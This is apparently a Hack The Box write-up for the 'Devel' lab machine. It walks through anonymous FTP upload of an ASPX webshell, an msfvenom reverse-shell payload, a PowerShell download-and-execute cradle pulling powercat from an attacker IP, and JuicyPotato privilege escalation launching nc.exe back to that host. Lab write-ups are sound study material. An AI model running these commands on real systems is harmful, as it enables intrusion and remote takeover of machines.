# Devel Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sCV -oA devel 10.10.10.5``

21/tcp open  ftp     Microsoft ftpd

80/tcp open  http    Microsoft-IIS/7.5

# ${{\color{purple}Initial Foothold}}\ $

### After a quick enumeration I realize that it is possible to put files on the ftp 
### Access in anonymous is allowed **:white_check_mark:**

# ${{\color{purple}Exploitation}}\ $ 

``ftp 10.10.10.5 21``

``Name (10.10.10.5:kali): anonymous``

``Password:``

``binary ( I use this command to put binaries )``

``put rev.aspx``

``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=1234 -f aspx -o rev.aspx``

### OR

``locate aspx_cmd.aspx``

``put aspx_cmd.aspx``

![image](https://user-images.githubusercontent.com/123066149/219397419-44fde1a0-e643-4282-8907-0d00817154bb.png)

# ${{\color{purple}Privilege Escalation}}\ $

### After a quick enumeration I realize that we have the rights :

![devel](https://user-images.githubusercontent.com/123066149/219398041-6b747214-3eb2-4304-b5f8-9ed2307e7072.PNG)

``SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled ``

``SeImpersonatePrivilege        Impersonate a client after authentication Enabled `` **:white_check_mark:**

``SeCreateGlobalPrivilege       Create global objects                     Enabled ``

### I will use ``JuicyPotato.exe``

If the user has ``SeImpersonate`` or ``SeAssignPrimaryToken`` privileges then you are SYSTEM.

### I used powercat to get access to the server via the webshell

``powershell.exe -c IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:8080/powercat.ps1');powercat -c 10.10.16.5 -p 1234 -e cmd.exe``

![devel2](https://user-images.githubusercontent.com/123066149/219406681-2aee9dba-2860-453a-98a4-a03b67081fd4.PNG)

### And I used this command to get a system access

``Juicy.Potato.x86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\windows\system32\cmd.exe -a "/c  c:\inetpub\wwwroot\nc.exe -e cmd.exe 10.10.16.5 12344" -t *``

![image](https://user-images.githubusercontent.com/123066149/219407362-aa14e1c1-cc66-4084-8270-c3fd0dbc732f.png)

### To find the right CLSID (-c I used this site) :

https://ohpe.it/juicy-potato/CLSID/ 

### OR

https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

### To check the rights before making a long shell it is possible to use this command


``Juicy.Potato.x86.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -t * -p whoami``

![image](https://user-images.githubusercontent.com/123066149/219410104-8bcb8a91-3dbd-4b1a-9446-298b86ad72a6.png)


# ${{\color{purple}Points of Improvement}}\ $

* Check the system version to find the correct CLSID for Juicy.Potato
* Check the system version to find the right JuicyPotato
* Remember to use the ``binary`` mode of the ``ftp`` to transfer the ``.exe`` files

